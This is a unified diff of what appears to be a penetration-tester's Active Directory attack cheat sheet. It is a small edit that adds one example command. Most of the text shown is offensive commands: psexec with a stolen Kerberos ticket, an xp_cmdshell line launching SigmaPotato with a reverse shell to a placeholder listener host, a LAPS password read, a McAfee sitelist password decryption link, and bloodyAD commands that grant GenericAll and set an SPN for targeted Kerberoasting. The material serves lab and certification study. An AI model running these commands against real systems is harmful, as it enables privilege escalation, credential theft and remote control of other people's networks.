@@ -48,7 +48,6 @@ KRB5CCNAME=ticket.ccache impacket-psexec {{DOMAIN}}/administrator@{{COMPUTER_NAM
 > > `xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell {{LHOST}} 445"` 
 > > See https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f 
 
-
 McAfee decryption for sitelist.xml = https://github.com/funoverip/mcafee-sitelist-pwd-decryption 
 
 
@@ -70,6 +69,7 @@ Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
 
 If have WriteDACL and want to grant GenericAll / GenericWrite to a user
 ` bloodyAD --host <DC_IP> -d <domain> -u <user> -p <pass> add genericAll <TargetObject> <ControlledPrincipal> ` 
+Eg. `bloodyAD --host <DC_IP_or_Hostname> -d <Domain> -u Alice -p <Alice_Password> add genericAll Bob Alice` 
 
 If have GenericWrite over a user object and want to execute a targeted Kerberoast attack (by setting an SPN) 
 ` bloodyAD --host <DC_IP> -d <domain> -u <user> -p <pass> set object <TargetUser> servicePrincipalName -v "cifs/targeted-roast" ` 
